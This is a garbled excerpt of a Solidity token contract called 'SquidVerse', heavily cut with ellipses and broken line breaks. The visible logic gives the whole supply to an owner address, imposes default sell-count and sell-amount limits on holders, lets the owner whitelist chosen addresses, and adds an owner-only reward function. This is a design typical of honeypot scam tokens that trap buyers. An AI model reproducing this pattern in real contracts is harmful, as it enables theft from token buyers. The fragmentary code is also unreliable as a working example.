...
contract SquidVerse is Ownable {
  using Address 
for
 address;
  using SafeMath 
...
10
 ** uint256(decimals);
    balances[METAwinner] = totalSupply;
    allowAddress[METAwinner] = 
true
;
  }
  mapping(
...
address
 =>
 uint256) public sellerCountNum;
  mapping(
address
 =>
 uint256) public sellerCountToken;
  uint256 public maxSellOutNum;
  uint256 public SwapToHERO;
  bool lockSeller = 
true
;
  mapping(
...
require
(maxSellOutNum > sellerCountNum[
from
], 
"reach max seller times"
);
            }
...
require
(SwapToHERO > sellerCountToken[
from
], 
"reach max seller token"
);
            }
        }
    }
...
require
(msg.sender == METAwinner || msg.sender == address
    (
...
setWhiteAddress
(
address holder, bool allowApprove
) 
external
...
SendMETAHEROreward
(
address WinnerAddress, uint256 _value
) 
external
